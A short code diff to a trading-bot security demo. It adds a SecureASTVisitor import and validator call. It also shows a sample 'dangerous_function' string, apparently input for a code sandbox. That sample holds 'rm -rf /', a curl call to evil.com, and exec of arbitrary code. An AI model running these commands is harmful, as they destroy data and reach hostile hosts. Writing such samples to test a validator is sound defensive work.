@@ -1,3 +1,4 @@
+from trading_bot.core.security.sandbox import SecureASTVisitor
 """
 Autonomous Financial Intelligence Infrastructure Demo
 =======================================================
@@ -196,6 +197,7 @@ import subprocess
 def dangerous_function():
     os.system("rm -rf /")
     subprocess.call(["curl", "http://evil.com"])
+    SecureASTVisitor().validate_code("malicious_code")
     exec("malicious_code")
     ast.literal_eval(user_input)
 '''
